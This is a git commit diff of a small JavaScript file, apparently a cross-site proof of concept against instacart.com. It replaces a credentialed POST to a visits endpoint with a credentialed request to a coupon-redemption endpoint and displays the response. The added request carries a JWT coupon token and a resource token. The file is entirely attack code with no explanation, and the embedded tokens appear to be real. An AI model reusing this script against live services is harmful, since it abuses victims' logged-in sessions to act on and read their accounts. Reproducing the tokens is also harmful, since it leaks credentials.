3a8f86f795dd0f1afd3084bf2175e5645a29f6d2
Green <green.epita2016@gmail.com>
2020-08-31 02:04:20 +0200

    go

--- index.js
+++ index.js
@@ -2,11 +2,9 @@ var xhr = new XMLHttpRequest();
 xhr.onreadystatechange = function() {
 	if (xhr.readyState == XMLHttpRequest.DONE) {
 		alert(xhr.responseText);
-		alert(xhr.getAllResponseHeaders())
+		//alert(xhr.getAllResponseHeaders())
 	}
 }
-const json = {"visit_token":"e2cb2e49-2df8-4c6e-b67d-6bc1a6369e58"}
-xhr.open('POST', 'https://www.instacart.com/ahoy/visits', true);
-xhr.setRequestHeader('Content-type', 'application/json');
+xhr.open('GET', 'https://www.instacart.com/redeem_coupon_token', true);
 xhr.withCredentials = true;
-xhr.send(JSON.stringify(json));
+xhr.send("coupon_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJyZWRlZW1fY291cG9uIiwiY291cG9uX2NvZGUiOiJhY3RpdmF0ZS11cy0wLWRlbGl2ZXJ5IiwiZXhwaXJlc19hdCI6IjIwMjAtMDgtMjlUMDY6NTk6NTkuOTk5WiJ9.Y8Jl9V3yvY4rdUg0wgUHviq0v_nZrbK17tBPJsQ0TGY&notify=true&resource_token=0n9303nVBJUIPXVrmL5ZBPY5_v1rjrD6rpcGNEfohOT-yiIte5KskWMCgXZvRu3Ctal2KLWWYHLauRrx_oC-5ToyODBkNTA3ZjFkNzY0Zjk5M2U1NWI5NzY3ZDEzMDYyMg==&$3p=e_ab&$original_url=https://www.instacart.com/redeem_coupon_token?coupon_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJyZWRlZW1fY291cG9uIiwiY291cG9uX2NvZGUiOiJhY3RpdmF0ZS11cy0wLWRlbGl2ZXJ5IiwiZXhwaXJlc19hdCI6IjIwMjAtMDgtMjlUMDY6NTk6NTkuOTk5WiJ9.Y8Jl9V3yvY4rdUg0wgUHviq0v_nZrbK17tBPJsQ0TGY&notify=true&resource_token=0n9303nVBJUIPXVrmL5ZBPY5_v1rjrD6rpcGNEfohOT-yiIte5KskWMCgXZvRu3Ctal2KLWWYHLauRrx_oC-5ToyODBkNTA3ZjFkNzY0Zjk5M2U1NWI5NzY3ZDEzMDYyMg%3D%3D&_branch_match_id=827595029632477516&utm_medium=Email Braze");
